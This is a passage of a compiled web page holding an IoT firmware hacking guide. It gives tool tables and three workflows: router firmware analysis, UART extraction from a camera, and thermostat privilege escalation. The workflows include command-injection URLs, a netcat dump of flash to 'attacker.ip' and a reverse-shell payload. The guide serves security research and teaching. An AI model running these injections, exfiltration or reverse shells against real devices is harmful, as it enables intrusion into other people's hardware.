Tool"}),(0,s.jsx)(n.td,{children:"Linux (web-based)"})]})]})]}),"\n",(0,s.jsx)(n.h3,{id:"hardware-tools",children:"Hardware Tools"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"}),(0,s.jsx)(n.th,{children:"Cost"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Bus Pirate"})}),(0,s.jsx)(n.td,{children:"Multi-protocol hardware tool (SPI, I2C, UART, JTAG)"}),(0,s.jsx)(n.td,{children:"~$35"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"CH341A"})}),(0,s.jsx)(n.td,{children:"USB SPI flash programmer"}),(0,s.jsx)(n.td,{children:"~$5"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"FT232"})}),(0,s.jsx)(n.td,{children:"USB to UART adapter"}),(0,s.jsx)(n.td,{children:"~$5"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"J-Link"})}),(0,s.jsx)(n.td,{children:"JTAG debugger (ARM)"}),(0,s.jsx)(n.td,{children:"$60-400"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Raspberry Pi"})}),(0,s.jsx)(n.td,{children:"Multi-purpose (SPI programmer, JTAG, GPIO)"}),(0,s.jsx)(n.td,{children:"$35-75"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Logic Analyzer"})}),(0,s.jsx)(n.td,{children:"Protocol analysis (Saleae Logic, etc.)"}),(0,s.jsx)(n.td,{children:"$100-500"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"JTAGulator"})}),(0,s.jsx)(n.td,{children:"JTAG pin identification"}),(0,s.jsx)(n.td,{children:"$150"})]})]})]}),"\n",(0,s.jsx)(n.h3,{id:"emulation--debugging",children:"Emulation & Debugging"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"QEMU"})}),(0,s.jsx)(n.td,{children:"CPU emulation (ARM, MIPS, PowerPC, etc.)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Firmadyne"})}),(0,s.jsx)(n.td,{children:"Automated firmware emulation framework"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"firmware-analysis-toolkit"})}),(0,s.jsx)(n.td,{children:"Wrapper for Firmadyne"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"ARM-X"})}),(0,s.jsx)(n.td,{children:"ARM firmware emulation framework"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"OpenOCD"})}),(0,s.jsx)(n.td,{children:"JTAG debugging"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"GDB-multiarch"})}),(0,s.jsx)(n.td,{children:"Multi-architecture debugger"})]})]})]}),"\n",(0,s.jsx)(n.h3,{id:"binary-analysis-1",children:"Binary Analysis"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Ghidra"})}),(0,s.jsx)(n.td,{children:"Disassembler/decompiler (ARM, MIPS support)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"IDA Pro"})}),(0,s.jsx)(n.td,{children:"Commercial disassembler (best ARM/MIPS support)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Radare2"})}),(0,s.jsx)(n.td,{children:"Open-source RE framework"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"angr"})}),(0,s.jsx)(n.td,{children:"Binary analysis framework (symbolic execution)"})]})]})]}),"\n",(0,s.jsx)(n.h3,{id:"exploitation",children:"Exploitation"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Metasploit"})}),(0,s.jsx)(n.td,{children:"Exploitation framework"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"pwntools"})}),(0,s.jsx)(n.td,{children:"Exploit development (Python)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Burp Suite"})}),(0,s.jsx)(n.td,{children:"Web application testing"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Nmap"})}),(0,s.jsx)(n.td,{children:"Network scanning (identify open ports/services)"})]})]})]}),"\n",(0,s.jsx)(n.h3,{id:"utilities",children:"Utilities"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Essential command-line tools:\nsudo apt install \\\n    binwalk \\\n    firmware-mod-kit \\\n    squashfs-tools \\\n    mtd-utils \\\n    cramfsprogs \\\n    flashrom \\\n    openocd \\\n    qemu-user-static \\\n    qemu-system-arm \\\n    qemu-system-mips \\\n    gdb-multiarch \\\n    python3-pip\n\n# Python tools:\npip3 install binwalk python-lzo\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"practical-workflows",children:"Practical Workflows"}),"\n",(0,s.jsx)(n.h3,{id:"workflow-1-router-firmware-analysis",children:"Workflow 1: Router Firmware Analysis"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Scenario:"})," Analyze TP-Link router firmware for vulnerabilities."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 1: Acquire firmware"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"wget https://static.tp-link.com/.../ArcherC7v5_us_firmware.bin\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 2: Extract filesystem"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"binwalk -e ArcherC7v5_us_firmware.bin\ncd _ArcherC7v5_us_firmware.bin.extracted/squashfs-root/\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 3: Search for vulnerabilities"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Hardcoded credentials:\ngrep -r "password" etc/\n\n# Web vulnerabilities:\nfind www/ -name "*.cgi" -exec grep -l "system(" {} \\;\n\n# Example: /www/cgi-bin/admin.cgi calls system() with user input\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 4: Test exploit"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Emulate firmware (Firmadyne or QEMU)\n# Access web interface: http://192.168.0.1/\n# Test command injection:\ncurl "http://192.168.0.1/cgi-bin/admin.cgi?cmd=;id"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 5: Report vulnerability"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Responsible disclosure to TP-Link\n# CVE request\n"})}),"\n",(0,s.jsx)(n.h3,{id:"workflow-2-iot-camera-firmware-extraction",children:"Workflow 2: IoT Camera Firmware Extraction"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Scenario:"})," Extract firmware from Wyze camera via UART."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 1: Open device, identify UART"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Locate 4-pin header (TX, RX, GND, VCC)\n# Use multimeter to identify GND (continuity to USB shield)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 2: Connect UART adapter"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Device TX -> Adapter RX\n# Device RX -> Adapter TX\n# Device GND -> Adapter GND\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 3: Determine baud rate"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Try 115200 baud:\nscreen /dev/ttyUSB0 115200\n\n# Press Enter, look for readable output\n# If garbage, try other baud rates\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 4: Access shell"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Power on device, interrupt boot:\n# Press Ctrl+C during U-Boot countdown\n\n# Modify boot parameters:\nsetenv bootargs "init=/bin/sh"\nboot\n\n# Now have root shell\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 5: Dump firmware"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Identify flash partitions:\ncat /proc/mtd\n\n# Dump firmware:\ndd if=/dev/mtd0 | nc attacker.ip 1234\n\n# On attacker machine:\nnc -l -p 1234 > firmware.bin\n"})}),"\n",(0,s.jsx)(n.h3,{id:"workflow-3-smart-thermostat-privilege-escalation",children:"Workflow 3: Smart Thermostat Privilege Escalation"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Scenario:"})," Escalate from web user to root shell."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 1: Analyze web application"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Extract firmware, navigate to web root:\ncd squashfs-root/www/\n\n# Find authentication mechanism:\ngrep -r "login" *.php *.cgi\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 2: Identify command injection"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Vulnerable CGI: /cgi-bin/settings.cgi\n# Parameter "temp" is passed to system():\nsystem("echo $QUERY_STRING > /tmp/temp.txt");\n\n# Test injection:\ncurl "http://thermostat.ip/cgi-bin/settings.cgi?temp=25;id"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 3: Gain shell"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Reverse shell:\ncurl "http://thermostat.ip/cgi-bin/settings.cgi?temp=25;nc%20-e%20/bin/sh%20attacker.ip%201234"\n\n# On attacker machine:\nnc -l -p 1234\n# Got root shell!\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"learning-resources",children:"Learning Resources"}),"\n",(0,s.jsx)(n.h3,{id:"documentation",children:"Documentation"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Binwalk Documentation:"})," ",(0,s.jsx)(n.a,{href:"https://github.com/ReFirmLabs/binwalk/wiki",children:"https://github.com/ReFirmLabs/binwalk/wiki"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"OpenWrt Developer Guide:"})," ",(0,s.jsx)(n.a,{href:"https://openwrt.org/docs/guide-developer/start",children:"https://openwrt.org/docs/guide-developer/start"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Firmadyne Paper:"})," ",(0,s.jsx)(n.a,{href:"https://firmadyne.com/",children:"https://firmadyne.com/"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"OWASP IoT Security:"})," ",(0,s.jsx)(n.a,{href:"https://owasp.org/www-project-internet-of-things/",children:"https://owasp.org/www-project-internet-of-things/"})]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"books",children:"Books"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"The Hardware Hacker"}),' by Andrew "bunnie" Huang']}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Practical IoT Hacking"})," by Fotios Chantzis et al."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Hardware Hacking Projects for Geeks"})," by Scott Fullam"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"online-courses",children:"Online Courses"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Hardware Hacking (SANS SEC562)"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"IoT Penetration Testing (eLearnSecurity)"})}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Offensive IoT Exploitation"})," by Attify"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"practice-labs",children:"Practice Labs"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"IoT Goat (OWASP):"})," Vulnerable IoT firmware"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Damn Vulnerable Router Firmware (DVRF):"})," ",(0,s.jsx)(n.a,{href:"https://github.com/praetorian-inc/DVRF",children:"https://github.com/praetorian-inc/DVRF"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Damn Vulnerable ARM Router (DVAR):"})," Practice firmware exploitation"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"related-sops",children:"Related SOPs"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Analysis:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-reverse-engineering",children:"Reverse Engineering"})," - Binary analysis and disassembly techniques"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-cryptography-analysis",children:"Cryptography Analysis"})," - Firmware encryption and authentication bypass"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," - Malicious firmware component analysis"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Pentesting & Security:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-linux-pentest",children:"Linux Pentesting"})," - Embedded Linux exploitation"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-mobile-security",children:"Mobile Security"})," - Mobile firmware and bootloader analysis"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-vulnerability-research",children:"Vulnerability Research"})," - Finding embedded device vulnerabilities"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-web-application-security",children:"Web Application Security"})," - Web interfaces on IoT devices"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-detection-evasion-testing",children:"Detection Evasion Testing"})," - Bypassing firmware security mechanisms"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);